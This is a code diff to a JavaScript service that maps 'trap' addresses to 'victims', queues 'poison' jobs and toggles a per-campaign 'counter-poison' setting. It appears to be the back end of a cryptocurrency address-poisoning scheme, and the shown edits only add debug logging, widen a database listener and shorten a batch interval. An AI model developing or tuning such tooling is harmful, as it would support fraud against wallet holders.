@@ -316,9 +316,7 @@ function subscribeToNewTraps() {
             victimAddress: victim
           });
 
-          // 🚀 Map this trap to its victim for the cache
           trapToVictimMap.set(row.trap_address.toLowerCase(), victim);
-
           console.log('[REALTIME] Added ' + victim + ' to active victims (total: ' + victims.size + ')');
         } catch (err) {
           console.error('[REALTIME] Failed to process new trap: ' + err.message);
@@ -337,21 +335,31 @@ function subscribeToNewTraps() {
       }
     });
 
-  // Channel 2: Campaigns (Toggle Listener)
-  supabaseService
-    .channel('campaigns_changes')
+  // Channel 2: Campaigns (Toggle Listener) - 🚀 UPDATED WITH DEBUG LOGS
+  const campaignsChannel = supabaseService.channel('campaigns_changes');
+  campaignsChannel
     .on(
       'postgres_changes',
-      { event: 'UPDATE', schema: 'public', table: 'campaigns' },
+      { event: '*', schema: 'public', table: 'campaigns' }, // Listen to ALL events to ensure we catch UPDATE
       function (payload) {
-        const campId = payload.new.id;
-        const isEnabled = payload.new.counter_poison_enabled !== false;
-        const current = campaignSettings.get(campId) || {};
-        campaignSettings.set(campId, { ...current, counterPoisonEnabled: isEnabled });
-        logger.info(`[REALTIME] 🎛️ Campaign ${campId} counter-poison toggled to: ${isEnabled ? 'ON' : 'OFF'}`);
+        console.log(`[REALTIME] 📡 Campaigns event received: ${payload.eventType} for campaign ${payload.new.id}`);
+
+        if (payload.eventType === 'UPDATE') {
+          const campId = payload.new.id;
+          const isEnabled = payload.new.counter_poison_enabled !== false;
+          const current = campaignSettings.get(campId) || {};
+
+          // Only log if it actually changed
+          if (current.counterPoisonEnabled !== isEnabled) {
+            campaignSettings.set(campId, { ...current, counterPoisonEnabled: isEnabled });
+            logger.info(`[REALTIME] 🎛️ Campaign ${campId} counter-poison toggled to: ${isEnabled ? 'ON 🟢' : 'OFF 🔴'}`);
+          }
+        }
       }
     )
-    .subscribe();
+    .subscribe((status, err) => {
+      console.log('[DEBUG] 📡 Campaigns Realtime channel status:', status, err ? err.message : '');
+    });
 }
 
 // ─── Load traps from database ───
@@ -573,7 +581,7 @@ const trapToVictimMap = new Map();
 
 // 🚀 BATCH PROCESSING: Queue-and-flush system
 const BATCH_FLUSH_THRESHOLD = 40;
-const BATCH_FLUSH_INTERVAL_MS = 600000;
+const BATCH_FLUSH_INTERVAL_MS = 300000;
 const poisonQueue = new Map();
 let queueFlushTimer = null;
 
